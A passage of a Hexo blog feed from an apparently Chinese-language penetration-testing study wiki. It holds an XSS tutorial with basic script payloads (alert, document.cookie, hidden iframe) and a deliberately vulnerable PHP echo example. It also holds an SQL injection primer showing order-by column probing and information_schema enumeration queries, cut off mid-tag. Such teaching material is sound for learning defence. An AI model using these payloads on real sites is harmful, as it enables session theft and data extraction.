Web应急案例讲解</td><td></td><td></td></tr><tr><td>###</td><td></td><td></td></tr><tr><td>## 日志分析</td><td></td><td></td></tr><tr><td>### 1.Windows日志分析</td><td></td><td></td></tr></tbody></table><h3 id="2-Web日志分析"><a href="#2-Web日志分析" class="headerlink" title="2.Web日志分析"></a>2.Web日志分析</h3><h4 id="web日志分类"><a href="#web日志分类" class="headerlink" title="web日志分类"></a>web日志分类</h4><h4 id="常规日志分析"><a href="#常规日志分析" class="headerlink" title="常规日志分析"></a>常规日志分析</h4><p>主要关注</p><ul><li>1102 &gt; 清理审计日志</li><li>4624 &gt; 账号登录成功</li><li>4625 &gt; 账号登录失败</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;web入侵简介&quot;&gt;&lt;a href=&quot;#web入侵简介&quot; class=&quot;headerlink&quot; title=&quot;web入侵简介&quot;&gt;&lt;/a&gt;web入侵简介&lt;/h1&gt;&lt;h2 id=&quot;web入侵流程&quot;&gt;&lt;a href=&quot;#web入侵流程&quot; clas
      
    
    </summary>
    
    
      <category term="渗透" scheme="https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
      <category term="IOT渗透" scheme="https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/IOT%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://s40d1.github.io/wiki/hello-world/"/>
    <id>https://s40d1.github.io/wiki/hello-world/</id>
    <published>2020-09-11T23:56:29.986Z</published>
    <updated>2020-09-11T23:56:29.986Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="external nofollow noopener noreferrer">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="external nofollow noopener noreferrer">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="external nofollow noopener noreferrer">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external nofollow noopener noreferrer">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="external nofollow noopener noreferrer">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="external nofollow noopener noreferrer">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="external nofollow noopener noreferrer">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="external nofollow noopener noreferrer">Deployment</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;external nofollow noopener noreferrer&quot;&gt;Hexo&lt;/a&gt;! This is your very first post.
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>第六节 一文搞懂XSS跨站脚本攻击</title>
    <link href="https://s40d1.github.io/wiki/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AC%AC%E5%85%AD%E8%8A%82%20%E4%B8%80%E6%96%87%E6%90%9E%E6%87%82XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/"/>
    <id>https://s40d1.github.io/wiki/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AC%AC%E5%85%AD%E8%8A%82%20%E4%B8%80%E6%96%87%E6%90%9E%E6%87%82XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/</id>
    <published>2020-07-24T09:35:37.000Z</published>
    <updated>2020-07-24T09:39:04.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-XSS跨站脚本概要"><a href="#0x00-XSS跨站脚本概要" class="headerlink" title="0x00 XSS跨站脚本概要"></a>0x00 XSS跨站脚本概要</h1><h2 id="1、什么是XSS跨站脚本漏洞？"><a href="#1、什么是XSS跨站脚本漏洞？" class="headerlink" title="1、什么是XSS跨站脚本漏洞？"></a>1、什么是XSS跨站脚本漏洞？</h2><p>XSS跨站脚本（Cross-Site Scripting，XSS）自1996年诞生以来，如今已经历十多年的演化。由于和另一种网页技术-层叠样式表（Cascading Style Sheets，CSS）的缩写一样，为了防止混淆，故把原本的CSS简称为XSS。在各种WEB应用安全漏洞中，XSS跨站脚本攻击漏洞一直被OWASP（Open Web Application Security Project）组织评为十大应用安全中的其中之一。【参考OWASP TOP 10：2007年A2 / 2010年A2 / 2013年A3】</p><p>XSS最大的特点就是能注入恶意的HTML/JavaScript代码到用户浏览的网页上，是因WEB应用程序对用户输入过滤不足而产生的，当用户浏览这些网页时，就会执行其中的恶意代码。由于HTML代码和客户端JavaScript脚本能在受害者主机上的浏览器任意执行，这样等同于完全控制了WEB客户端的逻辑，在这个基础上，黑客可以轻易地发起Cookie窃取，会话劫持，钓鱼欺骗等各种各样的攻击。<br>       <strong>通常情况下，我们既可以把XSS理解成一种WEB应用安全漏洞，也可以理解成一种攻击手段。</strong></p><h2 id="2、XSS攻击流程"><a href="#2、XSS攻击流程" class="headerlink" title="2、XSS攻击流程"></a>2、XSS攻击流程</h2><p><img src="https://img-blog.csdnimg.cn/20200724151033461.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70" alt="XSS攻击流程"></p><h2 id="3、恶意脚本的形式"><a href="#3、恶意脚本的形式" class="headerlink" title="3、恶意脚本的形式"></a>3、恶意脚本的形式</h2><p>利用XSS弹警告框：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(‘xss’)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>获取cookie值：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="built_in">document</span>.cookie)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>嵌入其他网站：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=http:<span class="comment">//baidu.com width=0 height=0&gt;&lt;/iframe&gt;</span></span><br></pre></td></tr></table></figure><p>XSS输入也可能是HTML代码段，如使网页不停刷新：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">"refresh"</span> content=<span class="string">"0;"</span>&gt;</span><br></pre></td></tr></table></figure><h2 id="4、XSS危害检验概括"><a href="#4、XSS危害检验概括" class="headerlink" title="4、XSS危害检验概括"></a>4、XSS危害检验概括</h2><ol><li>网络钓鱼，包括盗取各类用户账号</li><li>窃取用户cookie资料，从而获取用户隐私信息，或利用用户身份进一步对网站执行操作</li><li>劫持用户（浏览器）会话，从而执行任意操作，例如进行非法转账，强制发表日志，发送电子邮件等</li><li>强制弹出广告页面，刷流量等</li><li>网页挂马</li><li>进行恶意操作，例如任意篡改页面信息，删除文章等</li><li>进行大量的客户端攻击，如DDOS攻击</li><li>获取客户端信息，例如用户的浏览历史，真实ip，开放端口等</li><li>控制受害者机器向其他网站发起攻击</li><li>结合其他漏洞进一步扩大攻击</li><li>提升用户权限，包括进一步渗透网站</li><li>传播XSS跨站脚本蠕虫等<h1 id="0x01-XSS跨站脚本分类"><a href="#0x01-XSS跨站脚本分类" class="headerlink" title="0x01 XSS跨站脚本分类"></a>0x01 XSS跨站脚本分类</h1><h2 id="1、反射型XSS"><a href="#1、反射型XSS" class="headerlink" title="1、反射型XSS"></a>1、反射型XSS</h2><h3 id="1-1反射型XSS概述"><a href="#1-1反射型XSS概述" class="headerlink" title="1.1反射型XSS概述"></a>1.1反射型XSS概述</h3>反射型XSS也被称为非持久性XSS，是现在最容易出现的一种XSS漏洞。当用户访问一个带有XSS代码的URL请求时，服务器端接收数据后处理，然后把带有XSS代码的数据发送到浏览器，浏览器解析这段带有XSS代码的数据后，最终造成XSS漏洞。<br>例子：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$username = $_GET[<span class="string">'username'</span>];</span><br><span class="line"><span class="keyword">echo</span> $username;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>在这段代码中，程序接收username值后再输出，如果提交xss1.php?username=test，那么程序将输出test，如果攻击者输入username=<script>alert(‘xss’)</script>，将会造成反射型XSS漏洞。<h3 id="1-2反射型XSS的流程"><a href="#1-2反射型XSS的流程" class="headerlink" title="1.2反射型XSS的流程"></a>1.2反射型XSS的流程</h3><img src="https://img-blog.csdnimg.cn/20200724155806348.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70" alt="反射型XSS"></li></ol><h2 id="2、存储型XSS"><a href="#2、存储型XSS" class="headerlink" title="2、存储型XSS"></a>2、存储型XSS</h2><h3 id="2-1-存储型XSS概述"><a href="#2-1-存储型XSS概述" class="headerlink" title="2.1 存储型XSS概述"></a>2.1 存储型XSS概述</h3><p>存储型XSS又被称为持久性XSS，存储型XSS是最危险的一种跨站脚本。允许用户存储数据的WEB应用程序都可能会出现存储型XSS漏洞，当攻击者提交一段XSS代码后，被服务器端接收并存储，当再次访问页面时，这段XSS代码被程序读取响应给浏览器，造成XSS跨站攻击，这就是存储型XSS。<br>在测试是否存在XSS时，首先要确定输入点与输出点，例如：我们要在留言内容上测试XSS漏洞，首先就要去寻找留言内容输出（显示）的地方是在标签内还是标签属性内，或者在其他地方，如果输出的数据在属性内，那么XSS是不会被执行的。</p><h3 id="2-2存储型XSS攻击流程"><a href="#2-2存储型XSS攻击流程" class="headerlink" title="2.2存储型XSS攻击流程"></a>2.2存储型XSS攻击流程</h3><p><img src="https://img-blog.csdnimg.cn/20200724151033461.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70" alt="XSS攻击流程"></p><h2 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h2><h1 id="0x02-检测XSS漏洞"><a href="#0x02-检测XSS漏洞" class="headerlink" title="0x02 检测XSS漏洞"></a>0x02 检测XSS漏洞</h1><h2 id="1、手工检测"><a href="#1、手工检测" class="headerlink" title="1、手工检测"></a>1、手工检测</h2><p>使用手工检测WEB应用程序是否存在XSS漏洞时，最重要的是考虑哪里有输入、输入的数据在什么地方输出。<br>1.可得知输出的位置<br>输入一些敏感字符，例如”、’、&lt;、&gt;、(、)等，在提交请求后查看HTML源代码，看这些输入的字符是否被转义。<br>2.无法得知输出位置<br>很多WEB应用程序源代码是不对外公开的，这时在测试XSS时就有可能无法得知输入数据到底在哪里显示。比如，测试留言本，留言之后要经过审核才显示，这时候就无法得知输入的数据在后台管理页面是何种状态。<br>通常可以采用””/&gt;XSS来测试。</p><h3 id="2、工具检测"><a href="#2、工具检测" class="headerlink" title="2、工具检测"></a>2、工具检测</h3><p>Appscan<br>AWVS<br>BurpSuite</p><h3 id="3、检测思路"><a href="#3、检测思路" class="headerlink" title="3、检测思路"></a>3、检测思路</h3><p>提交正常数据，使用firebug，chrome的调试等工具跟踪提交数据的标签，如果显示区域不在HTML属性内，则可以直接使用XSS代码注入。如果说不能得知内容输出的具体位置，则可以使用模糊测试。<br><strong>无论存储型XSS，还是反射型XSS。本质问题就是让对方浏览器执行你插入的JavaScript！</strong></p><h1 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h1><p>盗取cookie，登录账号的场景演示<br>假如<a href="http://test.com/xss1.php存在XSS反射型跨站漏洞，那么攻击者的步骤可能如下。" target="_blank" rel="external nofollow noopener noreferrer">http://test.com/xss1.php存在XSS反射型跨站漏洞，那么攻击者的步骤可能如下。</a></p><ol><li>test1是网站test.com的用户，此时正在登录的状态中。</li><li>攻击者发现<a href="http://test.com/xss1.php存在XSS反射型跨站漏洞，然后精心构造JavaScript代码，此段代码可以窃取用户的cookie。" target="_blank" rel="external nofollow noopener noreferrer">http://test.com/xss1.php存在XSS反射型跨站漏洞，然后精心构造JavaScript代码，此段代码可以窃取用户的cookie。</a></li><li>攻击者将带有反射型XSS漏洞的URL通过站内信息发送给用户test1，使用各种诱导的方式让用户test1去打开链接。</li><li>如果用户test1打开了带有XSS漏洞的URL，那么就会把自己的cookie发送到攻击者中。</li><li>攻击者接受到用户test1的会话cookie，就可以直接利用cookie以test1的身份登录test.com网站中。  </li></ol><p>以上步骤，通过使用反射型XSS漏洞可以以test1的身份登录网站，这就是其危害。  </p><h2 id="演示视频传送门"><a href="#演示视频传送门" class="headerlink" title="演示视频传送门"></a><a href="https://www.bilibili.com/video/BV12x411d7Jc/" target="_blank" rel="external nofollow noopener noreferrer"><strong>演示视频传送门</strong></a></h2><h1 id="0x04-漏洞防御"><a href="#0x04-漏洞防御" class="headerlink" title="0x04 漏洞防御"></a>0x04 漏洞防御</h1><p>输入与输出中的过滤<br>黑名单与白名单<br>WEB安全编码规范<br>HttpOnly cookie</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0x00-XSS跨站脚本概要&quot;&gt;&lt;a href=&quot;#0x00-XSS跨站脚本概要&quot; class=&quot;headerlink&quot; title=&quot;0x00 XSS跨站脚本概要&quot;&gt;&lt;/a&gt;0x00 XSS跨站脚本概要&lt;/h1&gt;&lt;h2 id=&quot;1、什么是XSS跨站脚本漏洞？&quot;&gt;
      
    
    </summary>
    
    
      <category term="渗透" scheme="https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
      <category term="Web渗透" scheme="https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/"/>
    
      <category term="学习笔记" scheme="https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="XSS" scheme="https://s40d1.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>第五节 一篇文章搞懂SQL注入</title>
    <link href="https://s40d1.github.io/wiki/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AC%AC%E4%BA%94%E8%8A%82%20%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E6%90%9E%E6%87%82SQL%E6%B3%A8%E5%85%A5/"/>
    <id>https://s40d1.github.io/wiki/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AC%AC%E4%BA%94%E8%8A%82%20%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E6%90%9E%E6%87%82SQL%E6%B3%A8%E5%85%A5/</id>
    <published>2020-07-24T03:35:37.000Z</published>
    <updated>2020-07-24T03:59:14.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0X00-数据库相关概念"><a href="#0X00-数据库相关概念" class="headerlink" title="0X00 数据库相关概念"></a>0X00 数据库相关概念</h1><h4 id="数据（DATA）：图像、语音、文字"><a href="#数据（DATA）：图像、语音、文字" class="headerlink" title="数据（DATA）：图像、语音、文字"></a>数据（DATA）：图像、语音、文字</h4><p>在计算机系统中，各种字母、数字符号的组合、语音、图形、图像等统称为数据。</p><h4 id="数据库-Database-：Access、MSSQL、Oracle、SQLITE、MySQL等"><a href="#数据库-Database-：Access、MSSQL、Oracle、SQLITE、MySQL等" class="headerlink" title="数据库(Database)：Access、MSSQL、Oracle、SQLITE、MySQL等"></a>数据库(Database)：Access、MSSQL、Oracle、SQLITE、MySQL等</h4><p>数据库是按照数据结构来组织、存储和管理数据的“仓库”。</p><h4 id="数据库管理系统-DBMS-：Access、MSSQL、Oracle、SQLITE、MySQL等"><a href="#数据库管理系统-DBMS-：Access、MSSQL、Oracle、SQLITE、MySQL等" class="headerlink" title="数据库管理系统(DBMS)：Access、MSSQL、Oracle、SQLITE、MySQL等"></a>数据库管理系统(DBMS)：Access、MSSQL、Oracle、SQLITE、MySQL等</h4><p>数据库管理系统(database management system)是一种操纵和管理数据库的软件，用于建立、使用和维护数据库。它对数据库进行统一的管理和控制，以保证数据库的安全性和完整性。</p><h4 id="结构化查询语言-SQL-：DQL、DDL、DML、TCL、DCL"><a href="#结构化查询语言-SQL-：DQL、DDL、DML、TCL、DCL" class="headerlink" title="结构化查询语言(SQL)：DQL、DDL、DML、TCL、DCL"></a>结构化查询语言(SQL)：DQL、DDL、DML、TCL、DCL</h4><p>结构化查询语言(Structured Query Language)简称SQL，结构化查询语言是一种数据库查询和程序设计语言，用于存取数据以及查询、更新和管理关系数据库系统。</p><h2 id="数据库常见的操作"><a href="#数据库常见的操作" class="headerlink" title="数据库常见的操作"></a>数据库常见的操作</h2><h2 id="1、增删改查：insert，update，delete，select"><a href="#1、增删改查：insert，update，delete，select" class="headerlink" title="1、增删改查：insert，update，delete，select"></a>1、增删改查：insert，update，delete，select</h2><p>查询user表的所有数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user;</span><br></pre></td></tr></table></figure><p>查询user表“name”等于“admin”的数据；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where name&#x3D;&quot;admin&quot;;</span><br></pre></td></tr></table></figure><p>往user表里面增加一个用户admin，并且密码为admin@123，电话1318888888</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into user values(&quot;admin&quot;,&quot;admin@123&quot;,&quot;13188888888&quot;);</span><br></pre></td></tr></table></figure><p>更改admin用户的密码为password</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update user set password&#x3D;&quot;password&quot; where name&#x3D;&quot;admin&quot;;</span><br></pre></td></tr></table></figure><p>删除新增admin用户所在的行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete from user where name&#x3D;&quot;admin&quot;;</span><br></pre></td></tr></table></figure><h2 id="2、SQL-order-by-语句"><a href="#2、SQL-order-by-语句" class="headerlink" title="2、SQL order by 语句"></a>2、SQL order by 语句</h2><p>order by语句通常是用来做排序的，默认按照升序排序。<br>但是在SQL注入中order by主要用来判断当前表是有多少列，然后配合联合查询来爆数据。<br>order by用法：<a href="http://10.1.131.10/cms/show.php?id=35利用order" target="_blank" rel="external nofollow noopener noreferrer">http://10.1.131.10/cms/show.php?id=35利用order</a> by来看当前表有多少列。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.1.131.10&#x2F;cms&#x2F;show.php?id&#x3D;35 order by 10回显正常</span><br><span class="line">http:&#x2F;&#x2F;10.1.131.10&#x2F;cms&#x2F;show.php?id&#x3D;35 order by 15回显正常</span><br><span class="line">http:&#x2F;&#x2F;10.1.131.10&#x2F;cms&#x2F;show.php?id&#x3D;35 order by 16回显不正常</span><br></pre></td></tr></table></figure><p>以上说明当前表有15列。</p><h2 id="3、union联合查询"><a href="#3、union联合查询" class="headerlink" title="3、union联合查询"></a>3、union联合查询</h2><p>利用联合查询把2个表的数据合在一个表里面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user union all select * from table2;</span><br></pre></td></tr></table></figure><p>如果不想看到前面的查询内容而只想看到后面的内容，可以使前面的查询结果为false：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where name&#x3D;1  union all select * from table2;</span><br></pre></td></tr></table></figure><p>user表里面没有name=1的，所以前面的查询返回false</p><h2 id="4、MySql数据库"><a href="#4、MySql数据库" class="headerlink" title="4、MySql数据库"></a>4、MySql数据库</h2><p>SQL注入中最常见利用的系统数据库，经常利用系统数据库配合union联合查询来获取数据库相关信息，因为系统数据库中所有信息都在这个数据库里面，比如所有数据库名、所有的表名、列名以及列名的数据库类型等，这里主要关注MYSQL系统数据库information_schema，关注系统数据库的表columns和schema表以及tables表：</p><blockquote><p>SCHEMATA表：提供了关于数据库的信息<br>COLUMNS表：给出了表中的列信息<br>TABLES表：给出了关于数据库中的表的信息</p></blockquote><h3 id="4-1-COLUMNS表查询数据库名"><a href="#4-1-COLUMNS表查询数据库名" class="headerlink" title="4.1 COLUMNS表查询数据库名"></a>4.1 COLUMNS表查询数据库名</h3><p>同表schemata一样，查询columns表里面的table_schema列一样可以得到所有数据库名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select distinct table_schema from information_schema.columns;</span><br></pre></td></tr></table></figure><h3 id="4-2COLUMNS表查询列名"><a href="#4-2COLUMNS表查询列名" class="headerlink" title="4.2COLUMNS表查询列名"></a>4.2COLUMNS表查询列名</h3><p>查询当前数据库所有列：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select distinct column_name from information_schema.columns;查询到当前有2232个列名</span><br></pre></td></tr></table></figure><h3 id="4-3COLUMNS表查询表名"><a href="#4-3COLUMNS表查询表名" class="headerlink" title="4.3COLUMNS表查询表名"></a>4.3COLUMNS表查询表名</h3><p>查询当前所有表名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select distinct table_name from information_schema.columns;查询结果当前473个表名</span><br></pre></td></tr></table></figure><h3 id="4-4TABLES表查询数据库名"><a href="#4-4TABLES表查询数据库名" class="headerlink" title="4.4TABLES表查询数据库名"></a>4.4TABLES表查询数据库名</h3><p>同表columns以及schemata一样，查询tables表里面的table_schema列一样可以得到所有数据库名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select distinct table_schema from information_schema.tables;</span><br></pre></td></tr></table></figure><h3 id="4-5TABLES表查询表名"><a href="#4-5TABLES表查询表名" class="headerlink" title="4.5TABLES表查询表名"></a>4.5TABLES表查询表名</h3><p>同columns表一样，从tables表里面的所有表名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select distinct table_name from information_schema.tables;</span><br></pre></td></tr></table></figure><h3 id="4-6MySQL函数"><a href="#4-6MySQL函数" class="headerlink" title="4.6MySQL函数"></a>4.6MySQL函数</h3><p>SQL函数是在SQL注入中用的比较多的，经常利用SQL函数来判断数据库的版本，当前用户，当前用户权限以及数据库的安装路径等等，以下是常用的MYSQL函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">system_user()系统用户名</span><br><span class="line">user()用户名</span><br><span class="line">current_user() 当前用户名</span><br><span class="line">session_user() 连接数据库用的用户名</span><br><span class="line">database() 数据库名</span><br><span class="line">version() mysql数据库版本</span><br><span class="line">load_file() mysql读取本地文件的函数</span><br><span class="line">@@datadir 数据库路径</span><br><span class="line">@@basedir mysql安装路径</span><br><span class="line">@@version_compile_os 操作系统</span><br></pre></td></tr></table></figure><h1 id="0X01SQL注入相关概念"><a href="#0X01SQL注入相关概念" class="headerlink" title="0X01SQL注入相关概念"></a>0X01SQL注入相关概念</h1><h2 id="1、静态页面"><a href="#1、静态页面" class="headerlink" title="1、静态页面"></a>1、静态页面</h2><p>html或者htm，是一种静态的页面格式，不需要服务器解析其中的脚本。由浏览器如(IE、Chrome等)解析。</p><blockquote><p>1.不依赖数据库<br>2.灵活性差，制作、更新、维护麻烦<br>3.交互性交差，在功能方面有较大的限制<br>4.安全，不存在SQL注入漏洞</p></blockquote><h2 id="2、动态页面"><a href="#2、动态页面" class="headerlink" title="2、动态页面"></a>2、动态页面</h2><p>asp、aspx、php、jsp等，由相应的脚本引擎来解释执行，根据指令生成静态网页。</p><blockquote><p>1.依赖数据库<br>2.灵活性好，维护简便<br>3.交互性好，功能强大<br>4.存在安全风险，可能存在SQL注入漏洞，这里要纠正一点，不是会动的或者有动态GIF图片就是动态网站，一定要是有上门所述的脚本语言构成的网站，如下图所示是一个php脚本搭建的动态网站</p></blockquote><h2 id="3、WEB应用工作原理"><a href="#3、WEB应用工作原理" class="headerlink" title="3、WEB应用工作原理"></a>3、WEB应用工作原理</h2><p><img src="https://img-blog.csdnimg.cn/202007241148071.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70" alt="WEB应用工作原理"></p><h2 id="4、SQL注入定义"><a href="#4、SQL注入定义" class="headerlink" title="4、SQL注入定义"></a>4、SQL注入定义</h2><p>SQL Injection：就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。<br>具体来说，它是利用现有应用程序，将（恶意）的SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句<br><strong>本质：</strong>代码数据不区分。<br><strong>成因：</strong>未对用户提交的参数数据进行校验或有效的过滤，直接进行SQL语句拼接，改变了原有SQL语句的语义，传入数据库解析引擎中执行。<br><strong>结果：</strong>SQL注入。</p><h2 id="5、SQL注入触发"><a href="#5、SQL注入触发" class="headerlink" title="5、SQL注入触发"></a>5、SQL注入触发</h2><p>所有的输入只要和数据库进行交互的，都有可能触发SQL注入<br>常见的包括：<br>Get参数触发SQL注入<br>POST参数触发SQL注入<br>Cookie触发SQL注入<br>其他参与sql执行的输入都有可能进行SQL注入</p><h2 id="6、SQL注入过程"><a href="#6、SQL注入过程" class="headerlink" title="6、SQL注入过程"></a>6、SQL注入过程</h2><p><img src="https://img-blog.csdnimg.cn/20200724114851523.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70" alt="SQL注入过程"></p><h2 id="7、SQL注入场景"><a href="#7、SQL注入场景" class="headerlink" title="7、SQL注入场景"></a>7、SQL注入场景</h2><p><strong>一切用户可控参数的地方，比如：URL路径、GET/POST请求参数、HTTP请求头</strong><br><img src="https://img-blog.csdnimg.cn/20200724114938144.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70" alt="SQL注入场景"></p><h2 id="8、SQL注入的作用"><a href="#8、SQL注入的作用" class="headerlink" title="8、SQL注入的作用"></a>8、SQL注入的作用</h2><ul><li>绕过登录验证：使用万能密码登录网站后台等</li><li>获取敏感数据：获取网站管理员帐号、密码等</li><li>文件系统操作：列目录，读取、写入文件等</li><li>注册表操作：读取、写入、删除注册表等</li><li>执行系统命令：远程执行命令</li></ul><h1 id="0X02-注入漏洞分类"><a 